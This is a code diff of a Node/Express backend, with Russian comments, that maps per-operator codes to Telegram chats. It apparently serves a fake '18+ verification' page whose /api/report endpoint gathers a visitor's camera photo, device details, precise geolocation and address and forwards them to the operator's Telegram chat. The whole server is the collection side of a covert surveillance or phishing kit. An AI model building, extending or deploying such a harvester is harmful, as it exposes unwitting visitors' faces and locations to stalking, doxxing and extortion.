@@ -1,4 +1,4 @@
-// === server/index.js (полная версия) ===
+// === server/index.js (минималистичный под code -> chat_id) ===
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
@@ -8,7 +8,6 @@ import { fileURLToPath } from 'url';
 
 // ==== ENV ====
 const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN || '';
-const DEFAULT_CHAT_ID  = process.env.TELEGRAM_CHAT_ID || '';
 const STATIC_ORIGIN    = process.env.STATIC_ORIGIN || '*';
 const PUBLIC_BASE      = (process.env.PUBLIC_BASE || STATIC_ORIGIN).replace(/\/+$/, '');
 const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET || '';
@@ -57,28 +56,19 @@ try {
 console.log('[db] using', DB_PATH);
 const db = new Database(DB_PATH);
 
-// tables
+// --- single table for new scheme
 db.prepare(`
-  CREATE TABLE IF NOT EXISTS links (
-    slug       TEXT PRIMARY KEY,
+  CREATE TABLE IF NOT EXISTS user_codes (
+    code       TEXT PRIMARY KEY,
     chat_id    TEXT NOT NULL,
-    owner_id   TEXT,
-    created_at INTEGER NOT NULL,
-    disabled   INTEGER DEFAULT 0
+    created_at INTEGER NOT NULL
   );
 `).run();
 
-db.prepare(`
-  CREATE TABLE IF NOT EXISTS link_recipients (
-    slug      TEXT NOT NULL,
-    chat_id   TEXT NOT NULL,
-    added_at  INTEGER NOT NULL,
-    PRIMARY KEY (slug, chat_id),
-    FOREIGN KEY (slug) REFERENCES links(slug)
-  );
-`).run();
+db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_chat_id ON user_codes(chat_id);`).run();
+db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_created_at ON user_codes(created_at);`).run();
 
-// migrate.sql (если есть)
+// migrate.sql (не обязателен; если лежит рядом — применим)
 try {
   const migratePath = path.join(__dirname, 'migrate.sql');
   if (fs.existsSync(migratePath)) {
@@ -113,7 +103,7 @@ async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'repo
   if (!chatId) throw new Error('Missing chat_id');
   if (!photoBuf?.length) throw new Error('Empty photo buffer');
 
-  // fetch/FormData/Blob есть в Node 20+
+  // Node 20: fetch/FormData/Blob глобально доступны
   const form = new FormData();
   form.append('chat_id', chatId);
   form.append('caption', caption);
@@ -132,124 +122,62 @@ async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'repo
 // ==== health ====
 app.get('/health', (_req, res) => res.json({ ok: true }));
 
-// DEBUG: инфо по БД
+// ==== DEBUG ====
 app.get('/api/debug/db', (req, res) => {
   try {
     const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
-    const links = db.prepare('SELECT COUNT(*) AS c FROM links').get().c;
-    const recs  = db.prepare('SELECT COUNT(*) AS c FROM link_recipients').get().c;
-    res.json({ ok:true, DB_PATH, size, links, recipients: recs });
+    const codes = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
+    res.json({ ok:true, DB_PATH, size, codes });
   } catch (e) {
     res.status(500).json({ ok:false, error:String(e) });
   }
 });
 
-// DEBUG: список получателей (по секрету)
-app.get('/api/debug/recipients', requireAdminSecret, (req, res) => {
-  const slug = String(req.query.slug || '').trim();
-  if (!slug) return res.status(400).json({ ok:false, error:'no slug' });
-  const list = db.prepare('SELECT chat_id, added_at FROM link_recipients WHERE slug = ?').all(slug);
-  res.json({ ok:true, slug, recipients:list });
-});
-
-// ==== API: link-info (для фронта) ====
-app.get('/api/link-info', (req, res) => {
-  const slug = String(req.query.slug || '').trim();
-  if (!slug || !/^[a-z0-9\-]{3,40}$/i.test(slug)) {
-    return res.status(400).json({ ok: false, error: 'Invalid slug' });
-  }
-  const row = db.prepare('SELECT chat_id, disabled FROM links WHERE slug = ?').get(slug);
-  if (!row || row.disabled) return res.status(404).json({ ok: false, error: 'Not found' });
-  res.json({ ok: true, chatId: String(row.chat_id) });
-});
-
-// ==== API: resolve-link (SPA фолбэк) ====
-app.get('/api/resolve-link', (req, res) => {
-  const slug = String(req.query.slug || '').trim();
-  if (!slug || !/^[a-z0-9\-]{3,40}$/i.test(slug)) {
-    return res.status(400).json({ ok: false, error: 'Invalid slug' });
-  }
-  const row = db.prepare('SELECT chat_id, disabled FROM links WHERE slug = ?').get(slug);
-  if (!row || row.disabled) return res.json({ ok: false, error: 'Not found' });
-  res.json({ ok: true, chatId: String(row.chat_id) });
-});
-
-// ==== API: register-link ====
-app.post('/api/register-link', requireAdminSecret, (req, res) => {
+// ==== Admin API: register-code (code -> chatId) ====
+app.post('/api/register-code', requireAdminSecret, (req, res) => {
   try {
-    const { slug, chatId, ownerId } = req.body || {};
-    if (!slug || !/^[a-z0-9\-]{3,40}$/i.test(slug)) {
-      return res.status(400).json({ ok: false, error: 'Invalid slug' });
+    const { code, chatId } = req.body || {};
+    if (!code || !/^[A-Z0-9\-]{3,40}$/i.test(code)) {
+      return res.status(400).json({ ok:false, error:'Invalid code' });
     }
     if (!chatId || !/^-?\d+$/.test(String(chatId))) {
-      return res.status(400).json({ ok: false, error: 'Invalid chatId' });
+      return res.status(400).json({ ok:false, error:'Invalid chatId' });
     }
-
-    const now = Date.now();
-    try {
-      db.prepare('INSERT INTO links(slug, chat_id, owner_id, created_at) VALUES(?,?,?,?)')
-        .run(slug, String(chatId), ownerId ? String(ownerId) : null, now);
-      db.prepare('INSERT OR IGNORE INTO link_recipients(slug, chat_id, added_at) VALUES(?,?,?)')
-        .run(slug, String(chatId), now); // владелец сразу получатель
-    } catch {
-      return res.status(409).json({ ok: false, error: 'Slug already exists' });
-    }
-
-    const url = `${PUBLIC_BASE}/r/${slug}`;
-    res.json({ ok: true, slug, url });
+    db.prepare('INSERT OR REPLACE INTO user_codes(code, chat_id, created_at) VALUES(?,?,?)')
+      .run(String(code).toUpperCase(), String(chatId), Date.now());
+    res.json({ ok:true, code:String(code).toUpperCase(), chatId:String(chatId) });
   } catch (e) {
-    console.error('[register-link] error:', e);
-    res.status(500).json({ ok: false, error: 'Internal' });
+    console.error('[register-code] error:', e);
+    res.status(500).json({ ok:false, error:'Internal' });
   }
 });
 
-// ==== API: claim-link (добавить ещё получателя) ====
-app.post('/api/claim-link', requireAdminSecret, (req, res) => {
-  try {
-    const { slug, chatId } = req.body || {};
-    if (!slug || !/^[a-z0-9\-]{3,40}$/i.test(slug)) {
-      return res.status(400).json({ ok: false, error: 'Invalid slug' });
-    }
-    if (!chatId || !/^-?\d+$/.test(String(chatId))) {
-      return res.status(400).json({ ok: false, error: 'Invalid chatId' });
-    }
-
-    const row = db.prepare('SELECT disabled FROM links WHERE slug = ?').get(slug);
-    if (!row || row.disabled) {
-      return res.status(404).json({ ok: false, error: 'Not found' });
-    }
-
-    db.prepare('INSERT OR IGNORE INTO link_recipients(slug, chat_id, added_at) VALUES(?,?,?)')
-      .run(slug, String(chatId), Date.now());
-
-    res.json({ ok: true, slug, chatId: String(chatId) });
-  } catch (e) {
-    console.error('[claim-link] error:', e);
-    res.status(500).json({ ok: false, error: 'Internal' });
-  }
-});
-
-// ==== Route: /r/:slug (инжект SLUG во фронт) ====
-app.get('/r/:slug', (req, res) => {
-  const { slug } = req.params;
-  const row = db.prepare('SELECT chat_id, disabled FROM links WHERE slug = ?').get(slug);
-  if (!row || row.disabled) return res.status(404).send('Not found');
-
+// ==== Pretty URL: /:code -> index.html?code=<code> ====
+app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
+  const code = req.params.code.toString();
   let html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
-  const inject = `<script>window.__SLUG=${JSON.stringify(slug)};</script>`;
-  html = html.replace('</body>', `${inject}\n</body>`);
+  // Заменяем URL на SPA с параметром code
+  const injected = html.replace(
+    /<head>/i,
+    `<head><script>history.replaceState(null,'','/index.html?code=${code}');</script>`
+  );
   res.setHeader('Content-Type', 'text/html; charset=utf-8');
-  res.send(html);
+  res.send(injected);
 });
 
-// ==== API: report (отправка фото всем привязанным) ====
+// ==== API: report (отправка фото ТОЛЬКО владельцу code) ====
 app.post('/api/report', async (req, res) => {
   try {
-    const { userAgent, platform, iosVersion, isSafari, geo, address, photoBase64, note, chatId, slug } = req.body || {};
+    const { userAgent, platform, iosVersion, isSafari, geo, address, photoBase64, note, code } = req.body || {};
     if (!BOT_TOKEN)   return res.status(500).json({ ok: false, error: 'No BOT token' });
     if (!photoBase64) return res.status(400).json({ ok: false, error: 'No photoBase64' });
+    if (!code)        return res.status(400).json({ ok: false, error: 'No code' });
 
-    const lines = [
+    const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?')
+      .get(String(code).toUpperCase());
+    if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });
+
+    const caption = [
       '<b>Новый отчёт 18+ проверка</b>',
       `UA: <code>${escapeHTML(userAgent || '')}</code>`,
       `Platform: <code>${escapeHTML(platform || '')}</code>`,
@@ -257,32 +185,15 @@ app.post('/api/report', async (req, res) => {
       geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
       address ? `Addr: <code>${escapeHTML(address)}</code>` : null,
       note ? `Note: <code>${escapeHTML(note)}</code>` : null
-    ].filter(Boolean);
-    const caption = lines.join('\n');
+    ].filter(Boolean).join('\n');
+
     const buf = b64ToBuffer(photoBase64);
-
-    let targets = [];
-    if (slug) {
-      targets = db.prepare('SELECT chat_id FROM link_recipients WHERE slug = ?')
-        .all(String(slug))
-        .map(r => String(r.chat_id));
-    }
-    if (!targets.length) {
-      const single = chatId && /^-?\d+$/.test(String(chatId)) ? String(chatId) : DEFAULT_CHAT_ID;
-      if (single) targets = [single];
-    }
-    if (!targets.length) return res.status(400).json({ ok: false, error: 'No recipients' });
-
-    const results = [];
-    for (const target of targets) {
-      try {
-        const tg = await sendPhotoToTelegram({ chatId: target, caption, photoBuf: buf });
-        results.push({ chatId: target, ok: true, message_id: tg?.result?.message_id });
-      } catch (e) {
-        results.push({ chatId: target, ok: false, error: e.message || String(e) });
-      }
-    }
-    res.json({ ok: true, sent: results });
+    const tg = await sendPhotoToTelegram({
+      chatId: String(row.chat_id),
+      caption,
+      photoBuf: buf
+    });
+    res.json({ ok: true, sent: [{ chatId: String(row.chat_id), ok: true, message_id: tg?.result?.message_id }] });
   } catch (e) {
     console.error('[report] error:', e);
     res.status(500).json({ ok: false, error: e.message || 'Internal error' });
@@ -301,4 +212,5 @@ app.listen(PORT, () => {
   console.log(`[server] listening on :${PORT}`);
   console.log(`[server] Public dir: ${PUBLIC_DIR}`);
   console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
+  console.log(`[server] PUBLIC_BASE: ${PUBLIC_BASE}`);
 });
